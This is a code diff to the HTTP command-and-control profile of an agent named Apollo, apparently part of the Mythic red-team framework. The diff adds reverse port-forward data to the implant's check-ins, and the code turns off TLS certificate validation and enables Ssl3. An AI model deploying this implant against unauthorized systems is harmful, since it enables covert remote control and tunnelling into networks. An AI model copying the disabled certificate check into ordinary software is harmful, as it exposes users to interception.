@@ -1,4 +1,4 @@
-﻿#define C2PROFILE_NAME_UPPER
+#define C2PROFILE_NAME_UPPER
 
 #if DEBUG
 #undef HTTP
@@ -101,6 +101,7 @@ namespace Mythic.C2Profiles
             // Necessary to disable certificate validation
             ServicePointManager.ServerCertificateValidationCallback =
                 delegate { return true; };
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
 #if USE_WEBCLIENT
             client = new WebClient();
             client.Proxy = null;
@@ -156,7 +157,6 @@ namespace Mythic.C2Profiles
                 try
                 {
 #if USE_HTTPWEB
-                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                     HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
                     request.KeepAlive = false;
                     request.Method = "Post";
@@ -293,7 +293,7 @@ namespace Mythic.C2Profiles
             return "";
         }
 
-        override public string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams=null)
+        override public string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams=null,PortFwdDatagram[] rdatagrams=null)
         {
             try // Try block for HTTP requests
             {
@@ -343,7 +343,8 @@ namespace Mythic.C2Profiles
                     action = "post_response",
                     responses = resps,
                     delegates = new Dictionary<string, string>[] { },
-                    socks = datagrams
+                    socks = datagrams,
+                    rportfwds = rdatagrams
                 };
                 if (DelegateMessageRequestQueue.Count > 0)
                 {
@@ -472,6 +473,10 @@ namespace Mythic.C2Profiles
                 if (resp.socks != null)
                 {
                     response.SocksDatagrams = resp.socks;
+                }
+                if (resp.rportfwds != null)
+                {
+                    response.PortFwdDg = resp.rportfwds;
                 }
             }
             response.Delegates = finalDelegateMessageList.ToArray();
